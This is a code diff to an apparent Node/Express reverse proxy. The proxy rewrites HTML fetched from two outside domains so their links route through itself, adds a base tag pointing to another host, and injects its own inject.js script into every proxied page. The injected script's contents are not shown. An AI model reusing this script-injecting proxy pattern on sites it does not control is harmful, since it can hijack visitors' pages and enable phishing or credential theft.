@@ -1494,21 +1494,27 @@ app.all('*', async (req, res) => {
 
     res.setHeader('Access-Control-Allow-Origin', '*');
 
-    // HTML — inject our script
+    // HTML — inject our script + set base so static assets load from vivipay.net directly
     if (ct.includes('text/html')) {
       let html = await response.text();
 
-      // Rewrite absolute tivox.icu / qonix.click URLs in HTML to go through proxy
       const proxyBase = 'https://' + PROXY_HOST;
+      const frontendBase = 'https://' + FRONTEND_HOST;
+
+      // Rewrite absolute tivox/qonix URLs to proxy
       html = html.replace(/https:\/\/tivox\.icu/g, proxyBase);
       html = html.replace(/https:\/\/qonix\.click/g, proxyBase);
 
-      // Inject inject.js right before </head>
-      const injectTag = `<script src="${proxyBase}/inject.js" defer></script>`;
+      // Add <base> tag so relative asset URLs (./assets/...) load directly from vivipay.net
+      // This avoids routing 1.9MB JS through Vercel serverless
+      const baseTag = `<base href="${frontendBase}/">`;
+
+      // Inject base tag + inject.js before </head>
+      const injectTag = `<script src="${proxyBase}/inject.js"></script>`;
       if (html.includes('</head>')) {
-        html = html.replace('</head>', injectTag + '\n</head>');
+        html = html.replace('</head>', baseTag + '\n' + injectTag + '\n</head>');
       } else {
-        html = injectTag + '\n' + html;
+        html = baseTag + '\n' + injectTag + '\n' + html;
       }
 
       const buf = Buffer.from(html, 'utf-8');
